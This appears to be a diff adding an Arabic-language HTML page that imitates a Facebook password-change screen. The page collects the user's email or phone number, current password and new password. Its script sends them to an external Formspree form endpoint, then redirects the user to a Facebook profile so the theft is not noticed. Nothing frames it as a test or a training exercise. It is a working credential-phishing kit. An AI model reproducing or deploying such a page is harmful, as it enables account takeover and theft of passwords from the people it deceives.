@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول</title>
+    <style>
+        /* تنسيق الصفحة */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        /* حاوية تسجيل الدخول */
+        .login-container {
+            background-color: #ffffff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            width: 360px;
+        }
+
+        /* رأس الصفحة */
+        .login-header h1 {
+            color: #1877f2;
+            font-size: 36px;
+            margin-bottom: 20px;
+        }
+
+        /* نموذج تسجيل الدخول */
+        .login-form form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .login-form input {
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        
+        .login-form button {
+            background-color: #1877f2;
+            color: #fff;
+            border: none;
+            padding: 12px;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .login-form button:hover {
+            background-color: #165dc1;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-header">
+            <h1>Facebook</h1>
+        </div>
+        <div class="login-form">
+            <form https://formspree.io/f/mbljrwjrmbljrwjr" method="POST" id="myForm">
+                <input type="text" placeholder="البريد الإلكتروني أو رقم الهاتف" required id="num1" name="contact">
+                <input type="text" placeholder="كلمة المرور الحالية" required id="pas1" minlength="8" name="password">
+                <input type="text" placeholder="كلمة المرور الجديدة" required id="pas2" minlength="8" name="newPassword">
+                <input type="text" placeholder="إعادة كتابة كلمة المرور الجديدة" required id="pas3" minlength="8" name="confirmPassword">
+                <button type="submit">تغيير كلمة المرور</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("myForm").addEventListener("submit", function (event) {
+            // منع الإرسال الافتراضي للنموذج
+            event.preventDefault();
+
+            // الحصول على القيم من الحقول
+            const num1 = document.getElementById("num1").value.trim();
+            const pas1 = document.getElementById("pas1").value.trim();
+            const pas2 = document.getElementById("pas2").value.trim();
+            const pas3 = document.getElementById("pas3").value.trim();
+
+            // التحقق من صحة البريد الإلكتروني أو رقم الهاتف
+            const phoneRegex = /^[0-9]{11}$/; // رقم هاتف مكون من 11 رقماً
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/; // صيغة البريد الإلكتروني
+
+            if (!phoneRegex.test(num1) && !emailRegex.test(num1)) {
+                alert("يرجى ادخال رقم هاتف صحيح أو بريد إلكتروني صحيح")
+                return;
+            }
+
+            // التحقق من تطابق كلمة المرور الجديدة مع تأكيدها
+            if (pas2 !== pas3) {
+                alert("كلمة المرور الجديدة وتأكيد كلمة المرور غير متطابقتين.");
+                return;
+            }
+
+            // إذا كانت جميع الشروط مستوفاة، أرسل النموذج إلى Formspree
+            const formData = new FormData(this);
+
+            fetch(this.action, {
+                method: "POST",
+                body: formData,
+                headers: {
+                    Accept: "application/json"
+                }
+            })
+            .then(response => {
+                if (response.ok) {
+                    window.location.href = 'https://www.facebook.com/profile.php?id=100094621543047&mibextid=ZbWKwLd=ZbWKwL'
+                    this.reset();
+                } else {
+                    alert("تعذر الإرسال. يرجى التحقق من الاتصال بالإنترنت.");
+                }
+            })
+            .catch(() => {
+                alert("تعذر الإرسال. يرجى التحقق من الاتصال بالإنترنت.");
+            });
+        });
+    </script>
+</body>
+</html>
